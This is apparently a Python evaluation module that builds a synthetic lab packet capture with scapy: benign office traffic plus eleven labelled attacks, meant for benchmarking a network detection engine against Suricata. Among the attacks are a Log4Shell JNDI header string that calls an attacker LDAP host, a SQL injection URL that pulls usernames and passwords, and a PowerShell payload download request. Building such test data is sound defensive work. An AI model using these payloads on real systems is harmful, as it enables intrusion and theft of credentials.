"""A reproducible lab capture: two hours of benign office traffic with eleven attacks, and its truth file.

    python -m evaluation.lab_pcap out/lab.pcap      # writes out/lab.pcap and out/lab.truth.json

Built packet by packet with scapy (real TCP handshakes, sequence numbers and checksums, a real TLS
ClientHello, DNS, HTTP, Kerberos), so both this engine (python -m evaluation.pcap) and Suricata
(suricata -r) can read the same capture. It is synthetic: it shows how the two behave on the same
well-defined attacks, not how either performs on a real network.
"""
import argparse
import json
import os
import random
import sys

from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, TCP, UDP
from scapy.layers.l2 import Ether
from scapy.packet import Raw
from scapy.utils import PcapWriter

ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))
T0 = 1_700_000_000.0
HOURS = 2.0
GATEWAY, DNS_SERVER, FILESERVER, DC = '10.0.0.1', '10.0.0.1', '10.0.0.5', '10.0.0.2'
CLIENTS = [f'10.0.0.{i}' for i in range(10, 15)]
WEB = [f'93.184.{i}.{j}' for i in (216, 217) for j in range(10, 25)]
NORMAL_NAMES = ['www.example.com', 'outlook.office365.com', 'api.github.com', 'fonts.gstatic.com',
                'login.microsoftonline.com', 'update.example.org', 'cdn.example.net']
HELLO = bytes.fromhex(open(os.path.join(ROOT, 'tests', 'fixtures', 'clienthello_example_com.hex')).read().strip())
MAC_C, MAC_S = '02:00:00:00:00:01', '02:00:00:00:00:02'


class Capture:
    def __init__(self, seed):
        self.packets = []
        self.rnd = random.Random(seed)

    def add(self, t, pkt):
        frame = Ether(src=MAC_C, dst=MAC_S) / pkt
        frame.time = t                     # on the frame written to the capture (composing makes a new packet)
        self.packets.append((t, len(self.packets), frame))

    def tcp(self, t, c, s, dport, exchange=(), close=True, gap=0.02, mss=1400, rst=False):
        """One TCP session: handshake, then `exchange` [('c'|'s', bytes)], each segment acknowledged, then FIN."""
        sport = self.rnd.randint(32768, 60999)
        seq = {'c': self.rnd.randint(1, 2**31), 's': self.rnd.randint(1, 2**31)}
        ends = {'c': (c, sport), 's': (s, dport)}

        def seg(side, flags, payload=b'', at=None):
            other = 's' if side == 'c' else 'c'
            (src, sp), (dst, dp) = ends[side], ends[other]
            pkt = IP(src=src, dst=dst) / TCP(sport=sp, dport=dp, flags=flags, seq=seq[side],
                                             ack=seq[other] if 'A' in flags else 0, window=65535)
            self.add(at, pkt / Raw(payload) if payload else pkt)

        seg('c', 'S', at=t)
        t += gap
        if rst:
            self.add(t, IP(src=s, dst=c) / TCP(sport=dport, dport=sport, flags='RA', seq=0, ack=seq['c'] + 1,
                                              window=0))
            return t
        seq['c'] += 1
        seg('s', 'SA', at=t)
        seq['s'] += 1
        t += gap
        seg('c', 'A', at=t)
        for side, data in exchange:
            other = 's' if side == 'c' else 'c'
            for i in range(0, len(data), mss):
                chunk = data[i:i + mss]
                t += gap / 4
                seg(side, 'PA', chunk, at=t)
                seq[side] += len(chunk)
                t += gap / 8
                seg(other, 'A', at=t)                      # every segment is acknowledged
        if close:
            t += gap
            seg('c', 'FA', at=t)
            seq['c'] += 1
            t += gap
            seg('s', 'FA', at=t)
            seq['s'] += 1
            t += gap
            seg('c', 'A', at=t)
        return t

    def appdata(self, n):
        """n bytes of TLS application data, framed in records."""
        out = b''
        while n > 0:
            k = min(n, 16384)
            out += b'\x17\x03\x03' + k.to_bytes(2, 'big') + self.rnd.randbytes(k)
            n -= k
        return out

    def server_hello(self):
        ext = b'\x00\x2b\x00\x02\x03\x04' + b'\x00\x33\x00\x24\x00\x1d\x00\x20' + self.rnd.randbytes(32)
        body = (b'\x03\x03' + self.rnd.randbytes(32) + b'\x20' + self.rnd.randbytes(32) + b'\x13\x01\x00'
                + len(ext).to_bytes(2, 'big') + ext)
        hs = b'\x02' + len(body).to_bytes(3, 'big') + body
        return b'\x16\x03\x03' + len(hs).to_bytes(2, 'big') + hs + b'\x14\x03\x03\x00\x01\x01'

    def https(self, t, c, s, up, down, gap=0.02):
        """A TLS 1.3 session: ClientHello, ServerHello, then `up` / `down` bytes of application data."""
        return self.tcp(t, c, s, 443, [('c', HELLO), ('s', self.server_hello() + self.appdata(down)),
                                       ('c', b'\x14\x03\x03\x00\x01\x01' + self.appdata(up))], gap=gap)

    def dns(self, t, c, name, answer='93.184.216.34', qtype='A'):
        qid = self.rnd.randint(1, 65535)
        sport = self.rnd.randint(32768, 60999)
        self.add(t, IP(src=c, dst=DNS_SERVER) / UDP(sport=sport, dport=53) / DNS(id=qid, rd=1, qd=DNSQR(qname=name, qtype=qtype)))
        rr = DNSRR(rrname=name, type=qtype, ttl=60, rdata=answer if qtype == 'A' else 'ok')
        self.add(t + 0.01, IP(src=DNS_SERVER, dst=c) / UDP(sport=53, dport=sport) /
                 DNS(id=qid, qr=1, ra=1, qd=DNSQR(qname=name, qtype=qtype), an=rr))


def build(seed=11):
    cap = Capture(seed)
    rnd = cap.rnd
    end = T0 + HOURS * 3600
    # ---------- benign background ----------
    for c in CLIENTS:
        t = T0 + rnd.uniform(0, 30)
        while t < end:
            name = rnd.choice(NORMAL_NAMES)
            cap.dns(t, c, name)
            cap.https(t + 0.05, c, rnd.choice(WEB), rnd.randint(300, 3000), rnd.randint(4000, 250000))
            if rnd.random() < 0.15:
                share = b'\x00\x00\x00\x50\xfeSMB' + b'\x00' * 76                # small SMB request
                cap.tcp(t + 1, c, FILESERVER, 445, [('c', share), ('s', b'\x00' + rnd.randint(200, 20000).to_bytes(3, 'big'))])
            t += rnd.uniform(20, 120)
    truth = []

    def attack(kind, src, start):
        truth.append({'id': f'{kind}-{len(truth) + 1}', 'kind': kind, 'src': src, 'start': start})

    # 1. port scan: SYNs to 400 ports
    t = T0 + 1800
    attack('port_scan', '10.0.0.66', t)
    for port in range(1, 401):
        cap.tcp(t + port * 0.05, '10.0.0.66', FILESERVER, port, rst=port not in (22, 445))
    # 2. host sweep: port 445 on 100 internal hosts
    t = T0 + 2400
    attack('host_sweep', '10.0.0.67', t)
    for i in range(20, 120):
        cap.tcp(t + i * 0.1, '10.0.0.67', f'10.0.0.{i}', 445, rst=True)
    # 3. SSH password guessing: 60 short sessions in two minutes
    t = T0 + 3000
    attack('brute_force', '10.0.0.68', t)
    for i in range(60):
        cap.tcp(t + i * 2 + rnd.uniform(0, 1.5), '10.0.0.68', FILESERVER, 22,
                [('s', b'SSH-2.0-OpenSSH_9.6\r\n'), ('c', b'SSH-2.0-libssh2_1.10.0\r\n'),
                 ('c', rnd.randbytes(300)), ('s', rnd.randbytes(900))])
    # 4. beaconing: HTTPS every 60 s (1% jitter) for an hour
    t = T0 + 600
    attack('beaconing', '10.0.0.69', t)
    for i in range(60):
        cap.https(t + i * 60 * (1 + rnd.uniform(-0.01, 0.01)), '10.0.0.69', '45.77.10.20',
                  rnd.randint(200, 2000), rnd.randint(500, 4000))
    # 5. jittered check-ins of constant size (session rhythm)
    t = T0 + 600
    attack('session_rhythm', '10.0.0.70', t)
    s = t
    for i in range(40):
        s += 60 * (1 + rnd.uniform(-0.5, 0.5))
        cap.tcp(s, '10.0.0.70', '45.77.10.21', 443, [('c', b'\x17\x03\x03\x04\x47' + b'\x00' * 1095),
                                                     ('s', b'\x17\x03\x03\x0a\x23' + b'\x00' * 2595)])
    # 6. DNS tunnelling
    t = T0 + 4000
    attack('dns_tunnel', '10.0.0.71', t)
    for i in range(150):
        label = ''.join(rnd.choices('abcdefghijklmnopqrstuvwxyz234567', k=50))
        cap.dns(t + i * 0.5, '10.0.0.71', f'{label}.t.tunnel-example.net', qtype='TXT')
    # 7. PowerShell download cradle over plain HTTP
    t = T0 + 4500
    attack('http_lolbin', '10.0.0.72', t)
    body = b'Write-Output "lab"\n' * 300
    cap.tcp(t, '10.0.0.72', '45.77.10.30', 80,
            [('c', b'GET /payload.ps1 HTTP/1.1\r\nUser-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) '
                   b'WindowsPowerShell/5.1.19041.1\r\nHost: 45.77.10.30\r\nConnection: Keep-Alive\r\n\r\n'),
             ('s', b'HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: %d\r\n\r\n' % len(body) + body)])
    # 8. Kerberoasting: 40 service-ticket requests in 30 s
    t = T0 + 5000
    attack('kerberos_burst', '10.0.0.73', t)
    for i in range(40):
        cap.add(t + i * 0.75, IP(src='10.0.0.73', dst=DC) / UDP(sport=50000 + i, dport=88) /
                Raw(b'\x6c\x82\x01\x00\x30\x82\x00\xfc' + bytes(rnd.getrandbits(8) for _ in range(120))))
    # 9. exfiltration: 8 MB upload to a new internet host
    t = T0 + 5500
    attack('exfiltration', '10.0.0.74', t)
    cap.https(t, '10.0.0.74', '45.77.10.40', 8_000_000, 3000, gap=0.002)
    # 10-11. known-bad payloads from the internet against the internal web server: what signature engines are
    # for; this engine has no payload signatures, so it is expected to miss them (included to keep the
    # comparison fair)
    t = T0 + 6000
    attack('exploit', '45.77.10.50', t)
    cap.tcp(t, '45.77.10.50', FILESERVER, 80,
            [('c', b'GET /search?q=test HTTP/1.1\r\nHost: intranet.corp.example\r\n'
                   b'User-Agent: ${jndi:ldap://45.77.10.50:1389/Exploit}\r\n'
                   b'X-Api-Version: ${jndi:ldap://45.77.10.50:1389/a}\r\nAccept: */*\r\n\r\n'),
             ('s', b'HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\n\r\n')])
    t = T0 + 6300
    attack('exploit', '45.77.10.51', t)
    cap.tcp(t, '45.77.10.51', FILESERVER, 80,
            [('c', b'GET /products.php?id=1%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1\r\n'
                   b'Host: intranet.corp.example\r\nUser-Agent: sqlmap/1.7.2#stable (https://sqlmap.org)\r\n'
                   b'Accept: */*\r\n\r\n'),
             ('s', b'HTTP/1.1 500 Internal Server Error\r\nContent-Length: 0\r\n\r\n')])
    cap.packets.sort()
    return [p for _, _, p in cap.packets], truth


def main(argv=None):
    parser = argparse.ArgumentParser(prog='python -m evaluation.lab_pcap')
    parser.add_argument('out', help='output .pcap path (the truth goes next to it as .truth.json)')
    parser.add_argument('--seed', type=int, default=11)
    args = parser.parse_args(argv)
    packets, truth = build(args.seed)
    os.makedirs(os.path.dirname(os.path.abspath(args.out)), exist_ok=True)
    with PcapWriter(args.out, sync=False) as w:
        for p in packets:
            w.write(p)
    truth_path = args.out.rsplit('.', 1)[0] + '.truth.json'
    with open(truth_path, 'w', encoding='utf-8') as f:
        json.dump(truth, f, indent=2)
    print(f'{len(packets)} packets -> {args.out}; {len(truth)} attacks -> {truth_path}')
    return 0


if __name__ == '__main__':
    sys.exit(main())
